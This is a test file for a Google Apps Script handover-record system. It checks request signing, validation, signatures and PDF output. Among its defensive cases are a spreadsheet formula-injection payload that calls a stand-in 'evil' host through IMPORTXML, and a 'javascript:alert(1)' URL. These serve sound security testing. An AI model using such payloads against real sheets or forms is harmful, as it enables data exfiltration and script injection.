import crypto from 'node:crypto';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { describe, expect, it } from 'vitest';
import { bundleAppsScript } from '../scripts/build-gas-bundle.mjs';
import { createGasRuntime, signGasRequest } from '../scripts/gas-emulator/runtime.mjs';
import { createPayload, itemInput, makePng, newToken, setupGas, sha256, todayKey } from './helpers';

const signature = () => makePng(400, 160).toString('base64');

function createConfirmed(env: ReturnType<typeof setupGas>) {
  const { payload, token } = createPayload();
  const created = env.call('createHandover', payload);
  expect(created.ok).toBe(true);
  const confirmed = env.call('confirmHandover', {
    tokenHash: token.hash,
    agreed: true,
    signatureBase64: signature(),
    comment: 'Đã nhận đủ',
    client: { ipHash: 'b'.repeat(32), userAgent: 'Mozilla/5.0 (iPhone)' },
  });
  expect(confirmed.ok).toBe(true);
  return { id: created.data.id as string, code: created.data.code as string, token };
}

describe('Apps Script – bảo mật request', () => {
  it('từ chối chữ ký sai, timestamp cũ, request lặp lại và sai scope', () => {
    const env = setupGas();
    const wrongSig = JSON.parse(env.rt.doPost(signGasRequest('khac-secret', 'health', {})));
    expect(wrongSig).toMatchObject({ ok: false, error: { code: 'UNAUTHORIZED' } });

    const old = JSON.parse(env.rt.doPost(signGasRequest(env.secret, 'health', {}, 'public', { ts: String(Date.now() - 10 * 60 * 1000) })));
    expect(old.error.code).toBe('UNAUTHORIZED');

    const body = signGasRequest(env.secret, 'health', {});
    expect(JSON.parse(env.rt.doPost(body)).ok).toBe(true);
    expect(JSON.parse(env.rt.doPost(body)).error.code).toBe('UNAUTHORIZED'); // replay

    expect(env.call('adminListHandovers', {}, 'public').error?.code).toBe('FORBIDDEN');
    expect(env.call('khongTonTai', {}).error?.code).toBe('BAD_REQUEST');
    expect(JSON.parse(env.rt.doPost('not json')).error.code).toBe('BAD_REQUEST');
  });

  it('báo NOT_CONFIGURED khi chưa có BACKEND_SHARED_SECRET; doGet không lộ dữ liệu', () => {
    const env = setupGas();
    delete env.rt.properties.BACKEND_SHARED_SECRET;
    expect(env.call('health').error?.code).toBe('NOT_CONFIGURED');
    const get = JSON.parse(env.rt.doGet());
    expect(get.ok).toBe(true);
    expect(JSON.stringify(get)).not.toContain('employee');
  });
});

describe('Apps Script – setupDatabase', () => {
  it('chạy lại nhiều lần không trùng dữ liệu, không xóa dữ liệu cũ, bổ sung cột thiếu', () => {
    const env = setupGas();
    const { payload } = createPayload();
    expect(env.call('createHandover', payload).ok).toBe(true);

    // Giả lập sheet cũ thiếu cột "cancel_reason" (xóa tiêu đề cột cuối).
    const sheet = env.rt.sheet('BAN_GIAO');
    const lastCol = sheet.getLastColumn();
    expect(sheet.getRange(1, lastCol).getValue()).toBe('cancel_reason');
    sheet.getRange(1, lastCol).setValue('');

    env.rt.run('setupDatabase');
    env.rt.run('setupDatabase');
    expect(env.rt.sheet('LOAI_BAN_GIAO').toObjects()).toHaveLength(7);
    expect(env.rt.sheet('CAU_HINH').toObjects()).toHaveLength(7);
    expect(env.rt.sheet('BAN_GIAO').toObjects()).toHaveLength(1);
    const headers = env.rt.sheet('BAN_GIAO').getRange(1, 1, 1, env.rt.sheet('BAN_GIAO').getLastColumn()).getValues()[0];
    expect(headers).toContain('cancel_reason');
    expect(env.call('health').data).toMatchObject({ database: 'ok', drive: 'ok' });
  });
});

describe('Apps Script – nhân viên & loại bàn giao', () => {
  it('chỉ trả nhân viên ACTIVE, không trả số điện thoại / trạng thái', () => {
    const env = setupGas();
    const res = env.call('listEmployees');
    expect(res.ok).toBe(true);
    const ids = res.data.employees.map((e: { employeeId: string }) => e.employeeId);
    expect(ids).toContain('DEMO-519');
    expect(ids).not.toContain('DEMO-107'); // INACTIVE
    expect(Object.keys(res.data.employees[0]).sort()).toEqual(['department', 'email', 'employeeId', 'fullName', 'position']);
  });

  it('cache nhân viên được làm mới qua refreshCache / onEdit; xóa được dữ liệu mẫu', () => {
    const env = setupGas();
    expect(env.call('listEmployees').data.employees).toHaveLength(7);
    const sheet = env.rt.sheet('NHAN_VIEN');
    const row = sheet.getLastRow() + 1;
    sheet.getRange(row, 1, 1, 7).setNumberFormat('@').setValues([['0519', 'Ngô Bảo Châu', 'R&D', 'Kỹ sư', 'chau@example.com', '0901234567', '']]);
    expect(env.call('listEmployees').data.employees).toHaveLength(7); // còn cache
    env.rt.run('onEdit', { range: { getSheet: () => ({ getName: () => 'NHAN_VIEN' }) } });
    const fresh = env.call('listEmployees').data.employees;
    expect(fresh).toHaveLength(8);
    expect(fresh.find((e: { fullName: string }) => e.fullName === 'Ngô Bảo Châu').employeeId).toBe('0519');

    env.rt.run('removeSampleEmployees');
    expect(env.call('refreshCache', {}, 'admin').data.employees).toBe(1);
  });

  it('danh sách lớn (> 100KB) vẫn cache được nhờ chia nhỏ', () => {
    const env = setupGas({ seed: false });
    const rows = Array.from({ length: 1500 }, (_, i) => [
      `NV${String(i).padStart(5, '0')}`,
      `Nguyễn Thị Phương Thảo Số ${i}`,
      'Phòng Kế hoạch Tổng hợp',
      'Chuyên viên',
      `nhanvien${i}@dieutuongam.example`,
      '',
      'ACTIVE',
    ]);
    const sheet = env.rt.sheet('NHAN_VIEN');
    sheet.insertRowsAfter(sheet.getMaxRows(), rows.length);
    sheet.getRange(2, 1, rows.length, 7).setNumberFormat('@').setValues(rows);
    env.call('refreshCache', {}, 'admin');
    expect(env.call('listEmployees').data.employees).toHaveLength(1500);
    expect(env.rt.cache.get('employees:v1:n')).not.toBeNull();
    expect(Number(env.rt.cache.get('employees:v1:n'))).toBeGreaterThan(1);
    expect(env.call('listEmployees').data.employees).toHaveLength(1500); // đọc từ cache
  });

  it('loại bàn giao đọc từ sheet LOAI_BAN_GIAO, cấu hình trường linh hoạt', () => {
    const env = setupGas();
    const sheet = env.rt.sheet('LOAI_BAN_GIAO');
    sheet.getRange(sheet.getLastRow() + 1, 1, 1, 6).setValues([['XE', 'Phương tiện', 'item_name*:Tên xe|asset_code*:Biển số|note:Ghi chú', '', '8', 'ACTIVE']]);
    env.call('refreshCache', {}, 'admin');
    const xe = env.call('listCategories').data.categories.find((c: { code: string }) => c.code === 'XE');
    expect(xe.fields).toEqual([
      { key: 'itemName', label: 'Tên xe', required: true },
      { key: 'assetCode', label: 'Biển số', required: true },
      { key: 'note', label: 'Ghi chú', required: false },
    ]);
  });
});

describe('Apps Script – tạo biên bản', () => {
  it('tạo biên bản 1 nội dung: mã BG-YYYYMMDD-0001, ghi BAN_GIAO + CHI_TIET + LICH_SU, chỉ lưu hash token', () => {
    const env = setupGas();
    const { payload, token } = createPayload();
    const res = env.call('createHandover', payload);
    expect(res.ok).toBe(true);
    expect(res.data.code).toBe(`BG-${todayKey()}-0001`);
    expect(res.data.receiver).toMatchObject({ employeeId: 'DEMO-519', name: 'Phạm Danh Thái', department: 'KHTH' });

    const [row] = env.rt.sheet('BAN_GIAO').toObjects();
    expect(row.public_token_hash).toBe(token.hash);
    expect(JSON.stringify(env.rt.sheet('BAN_GIAO').toObjects())).not.toContain(token.token);
    expect(row.status).toBe('PENDING');
    expect(row.created_at).toMatch(/^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}\+07:00$/);
    expect(env.rt.sheet('CHI_TIET_BAN_GIAO').toObjects()).toHaveLength(1);
    expect(env.rt.sheet('LICH_SU').toObjects()[0]).toMatchObject({ action: 'CREATED', new_status: 'PENDING' });
  });

  it('tạo biên bản nhiều nội dung, giữ thứ tự, mã tăng dần không trùng', () => {
    const env = setupGas();
    const items = [
      itemInput(),
      itemInput({ itemName: 'Adapter Dell 65W', assetCode: '', serialNumber: '' }),
      itemInput({ category: 'THE', itemName: 'Thẻ thang máy', assetCode: 'TM-09', serialNumber: 'BỎ QUA' }),
      itemInput({ category: 'TAI_KHOAN', itemName: 'Email công ty', assetCode: 'thai.pham', quantity: null }),
      itemInput({ category: 'CONG_VIEC', itemName: 'Website', workStatus: 'Đang làm', deadline: '2026-10-15', documentUrl: 'https://example.com/a' }),
      itemInput({ category: 'KHAC', itemName: '', description: 'Chìa khóa tủ hồ sơ số 3' }),
    ];
    const first = env.call('createHandover', createPayload({ items }).payload);
    expect(first.ok).toBe(true);
    const second = env.call('createHandover', createPayload().payload);
    expect(second.data.code).toBe(`BG-${todayKey()}-0002`);

    const token = newToken();
    env.call('createHandover', createPayload({ items, tokenHash: token.hash, tokenNonce: token.nonce }).payload);
    const view = env.call('getHandoverByToken', { tokenHash: token.hash }).data.handover;
    expect(view.code).toBe(`BG-${todayKey()}-0003`);
    expect(view.items.map((i: { itemName: string }) => i.itemName)).toEqual([
      'Laptop Dell Latitude 5440',
      'Adapter Dell 65W',
      'Thẻ thang máy',
      'Email công ty',
      'Website',
      '',
    ]);
    // Trường không thuộc loại "Thẻ" bị loại bỏ; deadline giữ dạng YYYY-MM-DD.
    expect(view.items[2].serialNumber).toBe('');
    expect(view.items[4].deadline).toBe('2026-10-15');
    expect(view.items[5].description).toBe('Chìa khóa tủ hồ sơ số 3');
  });

  it('mã không trùng kể cả khi property đếm bị xóa', () => {
    const env = setupGas();
    env.call('createHandover', createPayload().payload);
    delete env.rt.properties.HANDOVER_SEQ;
    expect(env.call('createHandover', createPayload().payload).data.code).toBe(`BG-${todayKey()}-0002`);
  });

  it('người nhận không tồn tại / ngừng hoạt động / trùng người giao → lỗi', () => {
    const env = setupGas();
    const missing = env.call('createHandover', createPayload({ receiverEmployeeId: 'KHONG-CO' }).payload);
    expect(missing.error).toMatchObject({ code: 'EMPLOYEE_NOT_FOUND' });
    expect(missing.error?.details.fieldErrors.receiverEmployeeId).toBeTruthy();
    expect(env.call('createHandover', createPayload({ receiverEmployeeId: 'DEMO-107' }).payload).error?.code).toBe('EMPLOYEE_NOT_FOUND');
    const same = env.call('createHandover', createPayload({ sender: { name: 'X', employeeId: 'DEMO-519' } }).payload);
    expect(same.error?.details.fieldErrors.receiverEmployeeId).toMatch(/khác người bàn giao/);
    expect(env.rt.sheet('BAN_GIAO').toObjects()).toHaveLength(0);
  });

  it('form thiếu trường / dữ liệu sai → VALIDATION_ERROR kèm fieldErrors', () => {
    const env = setupGas();
    const cases: Array<[Record<string, unknown>, string]> = [
      [{ sender: { name: '', employeeId: '' } }, 'sender.name'],
      [{ items: [] }, 'items'],
      [{ items: [itemInput({ category: 'KHONG_CO' })] }, 'items.0.category'],
      [{ items: [itemInput({ category: 'THE', itemName: '' })] }, 'items.0.itemName'],
      [{ items: [itemInput({ category: 'KHAC', itemName: '', description: '' })] }, 'items.0.description'],
      [{ items: [itemInput({ quantity: 0 })] }, 'items.0.quantity'],
      [{ items: [itemInput({ category: 'CONG_VIEC', deadline: '2026-02-30' })] }, 'items.0.deadline'],
      [{ items: [itemInput({ category: 'CONG_VIEC', documentUrl: 'javascript:alert(1)' })] }, 'items.0.documentUrl'],
      [{ items: [itemInput({ category: 'TAI_KHOAN', note: 'Mật khẩu: Abc@123' })] }, 'items.0.note'],
      [{ note: 'password = 123456' }, 'note'],
      [{ note: 'x'.repeat(2001) }, 'note'],
    ];
    for (const [override, field] of cases) {
      const res = env.call('createHandover', createPayload(override).payload);
      expect(res.error?.code, field).toBe('VALIDATION_ERROR');
      expect(Object.keys(res.error?.details.fieldErrors), field).toContain(field);
    }
    expect(env.rt.sheet('BAN_GIAO').toObjects()).toHaveLength(0);
  });

  it('chống formula injection và giữ nguyên số 0 đầu', () => {
    const env = setupGas();
    const token = newToken();
    env.call(
      'createHandover',
      createPayload({
        tokenHash: token.hash,
        tokenNonce: token.nonce,
        note: '=IMPORTXML("http://evil","//a")',
        items: [itemInput({ assetCode: '00123', serialNumber: '+84901', itemName: '@SUM(1)' })],
      }).payload,
    );
    const raw = env.rt.sheet('CHI_TIET_BAN_GIAO').toObjects()[0];
    expect(raw.asset_code).toBe('00123');
    expect(typeof raw.item_name).toBe('string');
    expect(JSON.stringify(env.rt.sheet('BAN_GIAO').toObjects())).not.toContain('__formula');
    const view = env.call('getHandoverByToken', { tokenHash: token.hash }).data.handover;
    expect(view.note).toBe('=IMPORTXML("http://evil","//a")');
    expect(view.items[0]).toMatchObject({ assetCode: '00123', serialNumber: '+84901', itemName: '@SUM(1)' });
  });
});

describe('Apps Script – link xác nhận', () => {
  it('token hợp lệ → dữ liệu công khai (không lộ hash/nonce/IP); token sai → NOT_FOUND; dò nhiều lần → RATE_LIMITED', () => {
    const env = setupGas();
    const { payload, token } = createPayload();
    env.call('createHandover', payload);
    const ok = env.call('getHandoverByToken', { tokenHash: token.hash });
    expect(ok.ok).toBe(true);
    const text = JSON.stringify(ok.data);
    expect(text).not.toContain(token.hash);
    expect(text).not.toContain(payload.tokenNonce);
    expect(text).not.toContain('ipHash');
    expect(ok.data.categories.length).toBeGreaterThan(0);

    const ipHash = 'c'.repeat(32);
    for (let i = 0; i < 30; i++) {
      expect(env.call('getHandoverByToken', { tokenHash: sha256(`sai-${i}`), client: { ipHash } }).error?.code).toBe('NOT_FOUND');
    }
    expect(env.call('getHandoverByToken', { tokenHash: token.hash, client: { ipHash } }).error?.code).toBe('RATE_LIMITED');
  });
});

describe('Apps Script – xác nhận & chữ ký', () => {
  it('xác nhận lưu chữ ký vào Drive signatures/YYYY/MM, cập nhật Sheet, chặn xác nhận lần 2', () => {
    const env = setupGas();
    const { payload, token } = createPayload();
    const created = env.call('createHandover', payload);

    expect(env.call('confirmHandover', { tokenHash: token.hash, agreed: false, signatureBase64: signature() }).error?.code).toBe(
      'VALIDATION_ERROR',
    );
    expect(env.call('confirmHandover', { tokenHash: token.hash, agreed: true, signatureBase64: 'aGVsbG8=' }).error?.details.fieldErrors.signature).toBeTruthy();

    const res = env.call('confirmHandover', {
      tokenHash: token.hash,
      agreed: true,
      signatureBase64: signature(),
      comment: '',
      client: { ipHash: 'd'.repeat(32), userAgent: 'Mozilla/5.0 (Android)' },
    });
    expect(res.ok).toBe(true);
    expect(res.data.id).toBe(created.data.id);
    expect(res.data.handover.status).toBe('CONFIRMED');

    const row = env.rt.sheet('BAN_GIAO').toObjects()[0];
    expect(row).toMatchObject({ status: 'CONFIRMED', confirmed_ip_hash: 'd'.repeat(32), user_agent: 'Mozilla/5.0 (Android)' });
    expect(row.signature_file_id).toBeTruthy();
    const file = env.rt.drive.getFileById(row.signature_file_id);
    const [y, m] = [row.confirmed_at.slice(0, 4), row.confirmed_at.slice(5, 7)];
    expect(env.rt.drive.pathOf(file)).toBe(`DTA_HANDOVER/signatures/${y}/${m}/${created.data.code}-signature.png`);
    expect(file.bytes.subarray(0, 4).toString('hex')).toBe('89504e47');
    expect(JSON.stringify(env.rt.sheet('BAN_GIAO').toObjects())).not.toMatch(/iVBORw0KGgo/); // không lưu base64 vào Sheet

    const again = env.call('confirmHandover', { tokenHash: token.hash, agreed: true, signatureBase64: signature() });
    expect(again.error?.code).toBe('ALREADY_CONFIRMED');
    expect(env.call('requestRevision', { tokenHash: token.hash, reason: 'Sửa lại giúp' }).error?.code).toBe('ALREADY_CONFIRMED');
    expect(env.rt.sheet('LICH_SU').toObjects().map((l: { action: string }) => l.action)).toEqual(['CREATED', 'CONFIRMED']);
  });

  it('Drive lỗi khi lưu chữ ký → DRIVE_ERROR, trạng thái giữ nguyên, thử lại thành công', () => {
    const env = setupGas();
    const { payload, token } = createPayload();
    env.call('createHandover', payload);
    env.rt.faults.set('drive', 1);
    const fail = env.call('confirmHandover', { tokenHash: token.hash, agreed: true, signatureBase64: signature() });
    expect(fail.error?.code).toBe('DRIVE_ERROR');
    expect(env.rt.sheet('BAN_GIAO').toObjects()[0].status).toBe('PENDING');
    expect(env.call('confirmHandover', { tokenHash: token.hash, agreed: true, signatureBase64: signature() }).ok).toBe(true);
  });

  it('Google Sheet lỗi → trả lỗi có cấu trúc, không crash', () => {
    const env = setupGas();
    env.rt.faults.set('sheets', 1);
    const res = env.call('listCategories');
    expect(res.ok).toBe(false);
    expect(res.error?.code).toBe('INTERNAL');
    expect(env.call('listCategories').ok).toBe(true);
  });
});

describe('Apps Script – yêu cầu chỉnh sửa & admin', () => {
  it('revision → sửa → link cũ dùng lại để xác nhận; đổi người nhận → cấp link mới', () => {
    const env = setupGas();
    const { payload, token } = createPayload();
    const id = env.call('createHandover', payload).data.id;

    expect(env.call('requestRevision', { tokenHash: token.hash, reason: 'abc' }).error?.code).toBe('VALIDATION_ERROR');
    const rev = env.call('requestRevision', { tokenHash: token.hash, reason: 'Laptop có vết xước ở góc trái màn hình.' });
    expect(rev.data.handover).toMatchObject({ status: 'REVISION_REQUESTED', receiverComment: 'Laptop có vết xước ở góc trái màn hình.' });
    expect(env.call('confirmHandover', { tokenHash: token.hash, agreed: true, signatureBase64: signature() }).error?.code).toBe(
      'INVALID_STATE',
    );

    const candidate = newToken();
    const updated = env.call(
      'adminUpdateHandover',
      {
        id,
        sender: { name: 'Nguyễn Văn An', employeeId: 'DEMO-101' },
        receiverEmployeeId: 'DEMO-519',
        note: 'Đã ghi nhận vết xước',
        items: [itemInput({ condition: 'Trầy xước góc trái' }), itemInput({ itemName: 'Chuột Logitech' })],
        candidateTokenHash: candidate.hash,
        candidateTokenNonce: candidate.nonce,
      },
      'admin',
    );
    expect(updated.ok).toBe(true);
    expect(updated.data.linkRotated).toBe(false);
    expect(updated.data.handover.status).toBe('PENDING');
    expect(updated.data.handover.items).toHaveLength(2);
    expect(env.rt.sheet('CHI_TIET_BAN_GIAO').toObjects()).toHaveLength(2); // bản cũ đã xóa
    const log = env.rt.sheet('LICH_SU').toObjects().find((l: { action: string }) => l.action === 'UPDATED');
    expect(JSON.parse(log.metadata).previousItems).toHaveLength(1);

    expect(env.call('confirmHandover', { tokenHash: token.hash, agreed: true, signatureBase64: signature() }).ok).toBe(true);
    expect(
      env.call('adminUpdateHandover', { ...payload, id, candidateTokenHash: candidate.hash, candidateTokenNonce: candidate.nonce }, 'admin').error
        ?.code,
    ).toBe('INVALID_STATE');

    // Đổi người nhận → link mới, link cũ hết hiệu lực.
    const second = createPayload();
    const id2 = env.call('createHandover', second.payload).data.id;
    const rotated = env.call(
      'adminUpdateHandover',
      { ...second.payload, id: id2, receiverEmployeeId: 'DEMO-102', candidateTokenHash: candidate.hash, candidateTokenNonce: candidate.nonce },
      'admin',
    );
    expect(rotated.data.linkRotated).toBe(true);
    expect(rotated.data.handover.tokenHash).toBe(candidate.hash);
    expect(env.call('getHandoverByToken', { tokenHash: second.token.hash }).error?.code).toBe('NOT_FOUND');
    expect(env.call('getHandoverByToken', { tokenHash: candidate.hash }).data.handover.receiver.name).toBe('Trần Thị Bích Ngọc');
  });

  it('hủy biên bản: chỉ khi chưa xác nhận; biên bản đã hủy không xác nhận được', () => {
    const env = setupGas();
    const { payload, token } = createPayload();
    const id = env.call('createHandover', payload).data.id;
    const cancelled = env.call('adminCancelHandover', { id, reason: 'Tạo nhầm' }, 'admin');
    expect(cancelled.data.handover).toMatchObject({ status: 'CANCELLED', cancelReason: 'Tạo nhầm' });
    expect(env.call('adminCancelHandover', { id }, 'admin').error?.code).toBe('INVALID_STATE');
    expect(env.call('confirmHandover', { tokenHash: token.hash, agreed: true, signatureBase64: signature() }).error?.code).toBe(
      'INVALID_STATE',
    );
    const confirmed = createConfirmed(env);
    expect(env.call('adminCancelHandover', { id: confirmed.id }, 'admin').error?.code).toBe('INVALID_STATE');
  });

  it('tạo link mới: link cũ hết hiệu lực', () => {
    const env = setupGas();
    const { payload, token } = createPayload();
    const id = env.call('createHandover', payload).data.id;
    const next = newToken();
    expect(env.call('adminRegenerateLink', { id, tokenHash: next.hash, tokenNonce: next.nonce }, 'admin').ok).toBe(true);
    expect(env.call('getHandoverByToken', { tokenHash: token.hash }).error?.code).toBe('NOT_FOUND');
    expect(env.call('getHandoverByToken', { tokenHash: next.hash }).ok).toBe(true);
  });

  it('danh sách admin: thống kê, lọc theo trạng thái / mã / tên không dấu / phòng ban / loại / ngày, phân trang', () => {
    const env = setupGas();
    createConfirmed(env);
    env.call('createHandover', createPayload({ receiverEmployeeId: 'DEMO-102', items: [itemInput({ category: 'THE', itemName: 'Thẻ ra vào' })] }).payload);
    const third = createPayload({ receiverEmployeeId: 'DEMO-103' });
    env.call('createHandover', third.payload);
    env.call('requestRevision', { tokenHash: third.token.hash, reason: 'Thiếu sạc laptop' });

    const all = env.call('adminListHandovers', {}, 'admin').data;
    expect(all.stats).toEqual({ total: 3, PENDING: 1, CONFIRMED: 1, REVISION_REQUESTED: 1, CANCELLED: 0 });
    expect(all.items[0].code > all.items[2].code).toBe(true); // mới nhất trước
    expect(all.departments).toEqual(expect.arrayContaining(['KHTH', 'Kế toán', 'Kinh doanh']));

    const q = (filters: Record<string, unknown>) => env.call('adminListHandovers', filters, 'admin').data;
    expect(q({ status: 'CONFIRMED' }).items.map((i: { receiverName: string }) => i.receiverName)).toEqual(['Phạm Danh Thái']);
    expect(q({ receiver: 'pham danh thai' }).total).toBe(1);
    expect(q({ employeeName: 'NGUYEN VAN AN' }).total).toBe(3);
    expect(q({ employeeId: 'demo-102' }).total).toBe(1);
    expect(q({ department: 'ke toan' }).total).toBe(1);
    expect(q({ category: 'THE' }).total).toBe(1);
    expect(q({ code: `BG-${todayKey()}-0002` }).total).toBe(1);
    const today = `${todayKey().slice(0, 4)}-${todayKey().slice(4, 6)}-${todayKey().slice(6)}`;
    expect(q({ from: today, to: today }).total).toBe(3);
    expect(q({ to: '2000-01-01' }).total).toBe(0);
    const page2 = q({ page: 2, pageSize: 5 });
    expect(page2).toMatchObject({ page: 2, pageSize: 5, total: 3 });
    expect(page2.items).toHaveLength(0);
    expect(all.items[0]).toMatchObject({ itemCount: expect.any(Number), categories: expect.any(Array) });
  });

  it('chi tiết admin: đầy đủ lịch sử, hash + nonce để Worker dựng link', () => {
    const env = setupGas();
    const { id } = createConfirmed(env);
    const detail = env.call('adminGetHandover', { id }, 'admin').data.handover;
    expect(detail).toMatchObject({ id, status: 'CONFIRMED', signatureAvailable: true, confirmedUserAgent: 'Mozilla/5.0 (iPhone)' });
    expect(detail.tokenHash).toMatch(/^[0-9a-f]{64}$/);
    expect(detail.tokenNonce).toBeTruthy();
    expect(detail.history.map((h: { action: string }) => h.action)).toEqual(['CREATED', 'CONFIRMED']);
    expect(env.call('adminGetHandover', { id: crypto.randomUUID() }, 'admin').error?.code).toBe('NOT_FOUND');
    const sig = env.call('adminGetSignature', { id }, 'admin').data;
    expect(sig.mimeType).toBe('image/png');
    expect(Buffer.from(sig.base64, 'base64').subarray(0, 4).toString('hex')).toBe('89504e47');
  });
});

describe('Apps Script – PDF', () => {
  it('sinh PDF vào Drive pdf/YYYY/MM, nội dung đủ thông tin, không tạo trùng, tạo lại được', () => {
    const env = setupGas();
    const { id, code, token } = createConfirmed(env);
    expect(env.call('generatePdf', { id }, 'system').ok).toBe(true);
    const html = env.rt.lastPdfHtml;
    for (const text of [code, 'Phạm Danh Thái', 'DEMO-519', 'KHTH', 'Laptop Dell Latitude 5440', 'Nguyễn Văn An', 'data:image/png;base64,', 'DIỆU TƯỚNG AM']) {
      expect(html).toContain(text);
    }
    const row = env.rt.sheet('BAN_GIAO').toObjects()[0];
    const pdfFile = env.rt.drive.getFileById(row.pdf_file_id);
    expect(env.rt.drive.pathOf(pdfFile)).toMatch(new RegExp(`^DTA_HANDOVER/pdf/\\d{4}/\\d{2}/${code}\\.pdf$`));

    const download = env.call('adminGetPdf', { id }, 'admin').data;
    expect(download.fileName).toBe(`${code}.pdf`);
    expect(Buffer.from(download.base64, 'base64').subarray(0, 5).toString()).toBe('%PDF-');
    expect(env.rt.sheet('BAN_GIAO').toObjects()[0].pdf_file_id).toBe(row.pdf_file_id); // không tạo trùng

    expect(env.call('getPdfByToken', { tokenHash: token.hash }).data.fileName).toBe(`${code}.pdf`);
    expect(env.call('adminGeneratePdf', { id, force: true }, 'admin').ok).toBe(true);
    const newId = env.rt.sheet('BAN_GIAO').toObjects()[0].pdf_file_id;
    expect(newId).not.toBe(row.pdf_file_id);
    expect(env.rt.drive.getFileById(row.pdf_file_id).isTrashed()).toBe(true);
  });

  it('chưa xác nhận thì không tải được PDF', () => {
    const env = setupGas();
    const { payload, token } = createPayload();
    const id = env.call('createHandover', payload).data.id;
    expect(env.call('getPdfByToken', { tokenHash: token.hash }).error?.code).toBe('INVALID_STATE');
    expect(env.call('adminGetPdf', { id }, 'admin').error?.code).toBe('INVALID_STATE');
  });
});

describe('Apps Script – chạy từ menu DTA Handover trong Google Sheet', () => {
  const scriptDir = path.join(import.meta.dirname, '..', 'apps-script');

  it('Thiết lập: hỏi khóa kết nối nếu chưa có, lưu (đã trim) và hiện kết quả', () => {
    const secret = crypto.randomBytes(32).toString('hex');
    const rt = createGasRuntime({ scriptDir, quiet: true, ui: { responses: [`  ${secret}  `] } });
    rt.run('setupDatabase');
    expect(rt.properties.BACKEND_SHARED_SECRET).toBe(secret);
    expect(rt.ui!.prompts).toHaveLength(1);
    const done = rt.ui!.alerts.at(-1)!;
    expect(done.title).toBe('DTA Handover – Thiết lập hoàn tất');
    expect(done.text).toContain('BACKEND_SHARED_SECRET: đã cấu hình (64 ký tự)');
    expect(done.text).not.toContain(secret);

    // Đã có khóa → chạy lại không hỏi nữa; kiểm tra cấu hình hiện hộp thoại kết quả
    rt.run('setupDatabase');
    expect(rt.ui!.prompts).toHaveLength(1);
    rt.run('checkSetup');
    expect(rt.ui!.alerts.at(-1)).toMatchObject({ title: 'DTA Handover – Kiểm tra cấu hình' });
    expect(rt.ui!.alerts.at(-1)!.text).toContain('KẾT QUẢ: Cấu hình hợp lệ.');
  });

  it('khóa không hợp lệ hoặc bấm Hủy → không lưu, báo cảnh báo', () => {
    const rt = createGasRuntime({ scriptDir, quiet: true, ui: { responses: ['ngan qua', null] } });
    rt.run('setupDatabase');
    expect(rt.properties.BACKEND_SHARED_SECRET).toBeUndefined();
    expect(rt.ui!.alerts.map((a) => a.text).join('\n')).toContain('Khóa không hợp lệ');
    expect(rt.ui!.alerts.at(-1)!.text).toContain('CẢNH BÁO: BACKEND_SHARED_SECRET chưa cấu hình');
    rt.run('setSharedSecret'); // bấm Hủy
    expect(rt.properties.BACKEND_SHARED_SECRET).toBeUndefined();
  });

  it('Nhập / đổi khóa kết nối từ menu; chạy trong trình soạn thảo thì báo hướng dẫn', () => {
    const secret = crypto.randomBytes(32).toString('hex');
    const rt = createGasRuntime({ scriptDir, quiet: true, ui: { responses: [secret] } });
    rt.run('setSharedSecret');
    expect(rt.properties.BACKEND_SHARED_SECRET).toBe(secret);
    expect(rt.ui!.alerts.at(-1)!.text).toContain('Đã lưu khóa kết nối');

    const editor = createGasRuntime({ scriptDir, quiet: true });
    expect(() => editor.run('setSharedSecret')).toThrow(/menu DTA Handover/);
  });
});

describe('Apps Script – bản gộp 1 file (npm run gas:bundle)', () => {
  it('dán 1 file duy nhất vẫn chạy đúng: setupDatabase, tạo, ký xác nhận, PDF', () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'dta-gas-bundle-'));
    try {
      fs.writeFileSync(path.join(dir, 'Mã.gs'), bundleAppsScript(), 'utf8');
      expect(fs.readdirSync(dir)).toEqual(['Mã.gs']);
      const secret = crypto.randomBytes(32).toString('hex');
      const rt = createGasRuntime({ scriptDir: dir, properties: { BACKEND_SHARED_SECRET: secret }, quiet: true });
      expect(rt.run('setupDatabase')).toContain('BACKEND_SHARED_SECRET: đã cấu hình');
      rt.run('seedSampleEmployees');
      const call = (action: string, payload: unknown = {}, scope = 'public') =>
        JSON.parse(rt.doPost(signGasRequest(secret, action, payload, scope)));
      expect(call('health').data).toMatchObject({ database: 'ok', drive: 'ok' });
      const { payload, token } = createPayload();
      const created = call('createHandover', payload);
      expect(created.data.code).toBe(`BG-${todayKey()}-0001`);
      expect(call('confirmHandover', { tokenHash: token.hash, agreed: true, signatureBase64: signature() }).data.handover.status).toBe(
        'CONFIRMED',
      );
      expect(call('generatePdf', { id: created.data.id }, 'system').ok).toBe(true);
    } finally {
      fs.rmSync(dir, { recursive: true, force: true });
    }
  });
});

describe('Apps Script – tiện ích quản trị', () => {
  it('checkSetup báo cáo hợp lệ; backupNow tạo bản sao trong backups', () => {
    const env = setupGas();
    expect(env.rt.run('checkSetup')).toContain('Cấu hình hợp lệ');
    expect(env.rt.run('backupNow')).toContain('Đã sao lưu');
    expect(env.rt.run('installWeeklyBackupTrigger')).toContain('Chủ nhật');
  });
});
